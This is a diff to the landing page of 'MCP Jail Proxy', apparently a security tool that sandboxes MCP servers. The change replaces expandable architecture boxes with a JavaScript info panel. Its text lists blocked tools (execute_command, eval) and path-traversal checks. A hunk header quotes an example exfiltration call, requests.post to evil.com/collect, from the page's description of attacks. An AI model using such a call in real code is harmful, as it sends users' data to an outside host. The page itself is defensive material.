@@ -223,42 +223,24 @@ requests.post("https://evil.com/collect", data={
       <div class="arch-simple">
         <!-- Flow diagram -->
         <div class="arch-flow-row">
-          <div class="arch-box-simple arch-clickable" data-expanded="false" onclick="toggleArchBox(this)">
+          <div class="arch-box-simple arch-clickable" onclick="showArchInfo('client')">
             <div class="arch-box-title">MCP Client</div>
             <div class="arch-box-sub">Claude, Cursor</div>
-            <div class="arch-box-details">
-              <p>MCP clients like Claude Desktop, Cursor, or any IDE with MCP support. They connect to MCP servers via stdio to get AI capabilities.</p>
-              <p><strong>Problem:</strong> Clients blindly trust servers and give them full system access.</p>
-            </div>
           </div>
           <div class="arch-arrow-simple">&#8594;</div>
-          <div class="arch-box-simple arch-box-accent arch-clickable" data-expanded="false" onclick="toggleArchBox(this)">
+          <div class="arch-box-simple arch-box-accent arch-clickable" onclick="showArchInfo('proxy')">
             <div class="arch-box-title">MCP Jail Proxy</div>
             <div class="arch-box-sub">Always active</div>
-            <div class="arch-box-details">
-              <p>Rust-based proxy that intercepts all MCP communication. Validates every request and response.</p>
-              <ul>
-                <li>Blocks dangerous tools (execute_command, eval)</li>
-                <li>Validates file paths (no ../ traversal)</li>
-                <li>Filters sensitive data from responses</li>
-                <li>Logs all operations for audit</li>
-              </ul>
-            </div>
           </div>
           <div class="arch-arrow-simple">&#8594;</div>
-          <div class="arch-box-simple arch-box-decision arch-clickable" data-expanded="false" onclick="toggleArchBox(this)">
+          <div class="arch-box-simple arch-box-decision arch-clickable" onclick="showArchInfo('sandbox')">
             <div class="arch-box-title">Sandbox</div>
             <div class="arch-box-sub">Auto-selected</div>
-            <div class="arch-box-details">
-              <p>Automatic sandbox selection based on availability:</p>
-              <ol>
-                <li><strong>Docker</strong> - Best isolation (if installed)</li>
-                <li><strong>macOS Sandbox</strong> - Good fallback on Mac</li>
-                <li><strong>Proxy-only</strong> - Warning shown if no sandbox</li>
-              </ol>
-            </div>
           </div>
         </div>
+
+        <!-- Info box that appears when clicking -->
+        <div class="arch-info-box" id="archInfoBox"></div>
 
         <!-- Three sandbox options -->
         <div class="arch-options">
@@ -794,9 +776,33 @@ ERROR: Tool 'run_code' is blocked by policy
       el.setAttribute('data-expanded', !expanded);
     }
 
-    function toggleArchBox(el) {
-      const expanded = el.getAttribute('data-expanded') === 'true';
-      el.setAttribute('data-expanded', !expanded);
+    const archInfo = {
+      client: '<strong>MCP Client</strong> — Apps like Claude Desktop, Cursor, or any IDE with MCP support. They connect to MCP servers via stdio. <p><em>Problem:</em> Clients blindly trust servers and give them full system access.</p>',
+      proxy: '<strong>MCP Jail Proxy</strong> — Rust-based proxy that intercepts all MCP communication.<ul><li>Blocks dangerous tools (execute_command, eval)</li><li>Validates file paths (no ../ traversal)</li><li>Filters sensitive data from responses</li><li>Logs all operations for audit</li></ul>',
+      sandbox: '<strong>Sandbox</strong> — Automatic selection based on availability:<ul><li><strong>Docker</strong> — Best isolation (if installed)</li><li><strong>macOS Sandbox</strong> — Good fallback on Mac</li><li><strong>Proxy-only</strong> — Warning if no sandbox available</li></ul>'
+    };
+
+    function showArchInfo(key) {
+      const box = document.getElementById('archInfoBox');
+      const boxes = document.querySelectorAll('.arch-clickable');
+
+      // Remove active from all
+      boxes.forEach(b => b.classList.remove('active'));
+
+      // If clicking same one, hide
+      if (box.dataset.active === key && box.classList.contains('visible')) {
+        box.classList.remove('visible');
+        box.dataset.active = '';
+        return;
+      }
+
+      // Show info
+      box.innerHTML = archInfo[key];
+      box.classList.add('visible');
+      box.dataset.active = key;
+
+      // Mark clicked box as active
+      event.currentTarget.classList.add('active');
     }
 
     // Hero Slider
